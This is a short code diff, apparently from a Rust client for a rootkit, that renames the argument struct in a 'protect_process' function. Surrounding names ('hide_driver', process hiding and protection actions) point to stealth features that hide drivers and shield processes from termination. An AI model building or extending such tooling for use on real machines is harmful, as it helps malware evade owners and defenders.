@@ -71,7 +71,7 @@ pub fn hide_driver(rank: u32) {
 
 /// Protect process given by its pid
 pub fn protect_process(pid: u32) {
-    let subargs = ProcessHidingSubargs { pid };
+    let subargs = ProcessProtectingSubargs { pid };
     let cmd_arg = TiktoorCmdArg {
         action: Action::ProcessProtection as c_uchar,
         subargs: &subargs as *const _ as *const c_void,
